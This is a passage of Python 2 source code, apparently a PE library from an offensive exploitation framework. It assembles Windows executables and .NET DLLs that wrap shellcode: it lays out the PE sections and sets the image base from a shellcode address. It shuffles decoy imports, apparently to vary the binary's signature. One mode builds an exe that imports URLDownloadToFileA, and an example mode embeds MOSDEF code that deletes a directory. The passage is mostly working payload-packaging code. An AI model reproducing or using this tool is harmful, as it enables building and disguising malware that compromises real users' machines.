        imgOpt.SizeOfCode = 6 + len(metadata) + clr.getSize() + 28 + \
              clr_import.getSize() * 2 + len(import_str) + 16 + iibn.getSize() + len(secondpad)

        code.SizeOfRawData  = imgOpt.SizeOfCode
        code.VirtualSize = imgOpt.SizeOfCode - len(secondpad)
        code.VirtualAddress = self.align(code_offset, imgOpt.SectionAlignment)
        code.PointerToRawData = code_offset

        rsrc.VirtualAddress = self.align(code.VirtualAddress + code.SizeOfRawData, imgOpt.SectionAlignment)
        rsrc.SizeOfRawData = len(rsrc_buf) + len(thirdpad)
        rsrc.VirtualSize = len(rsrc_buf)
        rsrc.PointerToRawData  = rsrc_offset

        reloc.VirtualAddress = self.align(rsrc.VirtualAddress + rsrc.SizeOfRawData, imgOpt.SectionAlignment)
        reloc.SizeOfRawData = 0xc + len(endpad)
        reloc.VirtualSize = 0xc
        reloc.PointerToRawData  = reloc_offset

        imgOpt.AddressOfEntryPoint = code.VirtualAddress + (entry_point - code_offset)
        imgOpt.BaseOfCode = code.VirtualAddress
        imgOpt.BaseOfData = rsrc.VirtualAddress
        imgOpt.ImageBase = shellcode_address & 0xffff0000

        # Resource Directory
        directories[2].VirtualSize=directories[2].Size = len(rsrc_buf)
        directories[2].VirtualAddress=rsrc.VirtualAddress

        #this 3 entries are relative to the beginning of code section
        # Import Directory
        directories[1].VirtualSize=directories[1].Size = end_import_offset - import_offset
        directories[1].VirtualAddress=code.VirtualAddress + (import_offset - code_offset)

        #Import Address Table Directory
        directories[12].VirtualSize=directories[12].Size = 8
        directories[12].VirtualAddress=code.VirtualAddress + (first_thunks_offset - code_offset)

        # CLR Directory
        directories[14].VirtualSize=directories[14].Size = clr.getSize()
        directories[14].VirtualAddress=code.VirtualAddress + (clr_offset - code_offset)

        # Relocations Directory
        directories[5].VirtualSize=directories[5].Size = 0xc
        directories[5].VirtualAddress=reloc.VirtualAddress

        # Filling the CLR structure
        clr.cb = 0x48
        clr.MajorRuntimeVersion = 0x2
        clr.MinorRuntimeVersion = 0x4
        clr.Flags = 0x3 #IL-Only
        clr.MetaDataVA = code.VirtualAddress + metadata_offset - code_offset
        clr.MetaDataSize = len(metadata)

        imgOpt.SizeOfImage = self.align(reloc.VirtualAddress + 1, imgOpt.SectionAlignment)

        clr_import.OriginalFirstThunk=code.VirtualAddress + (original_thunks_offset - code_offset)
        clr_import.FirstThunk=code.VirtualAddress + (first_thunks_offset - code_offset)
        clr_import.Name = code.VirtualAddress + (import_str_offset - code_offset)

        # RAWing...
        buf = mz.raw() + struct.pack("<L", PE_MAGIC) + imgHdr.raw() + imgOpt.raw()
        for a in directories:
            buf += a.raw()
        buf += code.raw()   #write section definitions first
        buf += rsrc.raw()
        buf += reloc.raw()
        buf += firstpad

        buf += binstring("FF 25") #our entry point is actually a JMP to _CorDllMain
        buf += struct.pack("<L", imgOpt.ImageBase + code.VirtualAddress + (first_thunks_offset - code_offset))

        buf += clr.raw()    #CLR data
        buf += binstring("13 30 01 00 10 00 00 00 01 00 00 11 02 28 03 00 00 0A 00 00 72 01 00 00 70 0A 00 2A") #.NET IL Method
        #                             ^^^^^^^^^^^ code size
        #                                         ^^^^^^^^^^^ localvar signature token
        #                                                                                ^^^^^^^^^^^ 0x70000001 Token - User String Stream, row 0x1
        #0x13 - Fat format / Call default constructor on all local variables.

        buf += metadata     #code data
        buf += clr_import.raw()   #import table
        buf += null_import.raw()
        buf += import_str

        buf += struct.pack("<L",code.VirtualAddress + (iibn_offset - code_offset))   # original first thunk
        buf += struct.pack("<L",0x0)

        buf += struct.pack("<L",code.VirtualAddress + (iibn_offset - code_offset))   # first thunk
        buf += struct.pack("<L",0x0)

        buf += iibn.raw()

        buf += secondpad

        buf += rsrc_buf     #rsrc data
        buf += thirdpad

        buf += struct.pack("<LLHH",code.VirtualAddress,0xc, 0x3000 | (imgOpt.AddressOfEntryPoint - code.VirtualAddress + 2) ,0)
        buf += endpad

        return buf
    
    #
    # This just returns a list of randomized imports that can be passed directly
    # to our PE creating functions.
    #
    def get_random_imports(self):

        # format of imports is imports = [("dllname.dll",["function","function"])]
        imports = [

                ("kernel32.dll",["IsDebuggerPresent","lstrlenA","GetLastError","LocalFree","UnhandledExceptionFilter"]),
                ("user32.dll",  ["MessageBoxA"]),
                ("advapi32.dll",["RevertToSelf"])
                
                ]
        
        # shuffle them up            
        random.shuffle(imports)
        
        for dll in imports:
            random.shuffle(dll[1])
            
        return imports

def usage(name):
    print "usage: %s -f <file> [-O|-W|-E|-N] [-a address_for_dotnet]" % name
    print "\t -O inspect the file given by -f"
    print "\t -W create a .exe using createShellcode"
    print "\t -E create a .exe using MOSDEF code"
    print "\t -N create a .dll using .NET code"
    sys.exit(0)

if __name__ == "__main__":
    import getopt, sys
    args= sys.argv[1:]
    OPEN  = 0x1
    WRITE = 0x2
    EXAMPLE = 0x3
    DOTNET = 0x4
    p=PElib()

    what=0
    address=0x41414141
    file=""
    try:
        opts, args = getopt.getopt(args, "f:OWENa:")
    except:
        print "Error in Arguments"
        usage(sys.argv[0])
    for o,a in opts:
        if o == '-a':
            address=int(a, 16)
        if o == '-f':
            file=a
        if o == '-O':
            what =OPEN
        if o == '-W':
            what = WRITE
        if o == '-E':
            what = EXAMPLE
        if o == '-N':
            what = DOTNET
    if file:
        if what == OPEN:
            p.openfile(file)
        elif what == WRITE:
            shellcode=p.createShellcode()
            imports = [ ("advapi32.dll", ["RevertToSelf", "AccessCheck"]), ("urlmon.dll", ["URLDownloadToFileA", "FindMediaType" ]) ] 

            p.createPE(file, shellcode, imports)

        elif what == EXAMPLE:
            vars={}
            vars["filename"]="boo"

            code="""      
                //start of code
                #import "remote", "kernel32.dll|GetProcAddress" as "getprocaddress"
                #import "remote", "kernel32.dll|RemoveDirectoryA" as "RemoveDirectory"
                #import "remote", "kernel32.dll|ExitProcess" as "exit"
                #import "string", "filename" as "filename"

                void main() 
                {
                int i;
                i = RemoveDirectory(filename);
                i = exit(0);
                }
                """


            p.createMOSDEFPE(file, code, vars)
        elif what == DOTNET:
            fd = open(file, "wb")
            fd.write(p.createDotNETPEFileBuf(p.createShellcode(), address))
            fd.close()
        else:
            usage(sys.argv[0])
    else:

        usage(sys.argv[0])


        #self._openPE()
